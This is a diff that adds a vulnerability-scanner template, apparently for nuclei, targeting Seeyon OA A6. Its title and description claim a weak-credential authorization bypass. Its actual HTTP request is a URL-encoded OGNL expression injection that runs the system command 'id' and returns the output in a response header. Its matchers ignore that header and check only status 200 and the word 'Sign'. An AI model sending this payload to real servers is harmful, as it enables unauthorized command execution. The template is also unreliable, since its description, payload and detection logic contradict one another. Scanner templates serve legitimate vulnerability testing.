@@ -1,0 +1,24 @@
+id: seeyon-oa-a6-weak-password
+
+info:
+  name: "致远OA A6 接口未授权访问漏洞（弱口令凭证WLCCYBD@SEEYON）"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    致远OA A6存在接口未授权访问安全缺陷，攻击者可利用弱口令凭证WLCCYBD@SEEYON绕过身份验证机制，直接访问系统管理接口。该漏洞允许非授权用户获取系统控制权限或敏感数据，存在严重安全风险。
+
+  tags: 致远
+
+http:
+- raw:
+  - |
+    GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'Sign'
